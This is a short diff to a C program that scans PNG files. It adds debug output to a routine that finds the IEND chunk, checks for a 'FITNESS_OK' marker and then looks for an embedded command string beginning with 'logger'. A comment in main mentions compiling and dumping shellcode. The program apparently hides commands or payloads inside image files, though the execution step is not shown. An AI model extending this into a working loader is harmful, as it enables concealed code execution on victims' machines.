@@ -323,13 +323,19 @@ void read_png_file(char *filename) {
     unsigned char *buf = malloc(file_size);
     if (buf) {
         fread(buf, 1, file_size, fp);
+        printf("DEBUG: File size: %ld bytes\n", file_size);
+        fflush(stdout);
         unsigned char iend[] = {0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82};
+        int iend_found = 0;
         for (long i = 0; i <= file_size - 8; i++) {
             if (memcmp(buf + i, iend, 8) == 0) {
+                printf("DEBUG: IEND found at offset %ld\n", i);
+                fflush(stdout);
+                iend_found = 1;
                 // Check for payload anywhere in the file
                 unsigned char *fitness = memmem(buf, file_size, "FITNESS_OK", 10);
                 if (fitness) {
-                    printf("Instrumentation Fitness: VALIDATED\n");
+                    printf("Instrumentation Fitness: VALIDATED at offset %ld\n", fitness - buf);
                     fflush(stdout);
                     
                     // Find the command string starting with 'logger'
@@ -677,6 +683,7 @@ int main(int argc, char *argv[]) {
 
     if (argc > 1){
      read_png_file(argv[1]);
+     //
      return 0;
     }
     //when running with no parameters we compile and dump shellcode for the local platform : 
